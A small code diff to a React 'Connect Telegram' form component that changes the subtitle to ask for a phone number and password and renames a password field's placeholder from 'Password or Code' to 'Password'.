@@ -54,7 +54,7 @@ function Password() {
         <div className="form-container">
             <div className="password-card">
                 <h2>Connect Telegram</h2>
-                <p>Please enter your details below</p>
+                <p>Please enter your phone number and password below</p>
 
                 <InputField
                     type="tel"
@@ -65,7 +65,7 @@ function Password() {
 
                 <InputField
                     type={showPassword ? "text" : "password"}
-                    placeholder="Password or Code"
+                    placeholder="Password"
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
                     showPassword={showPassword}
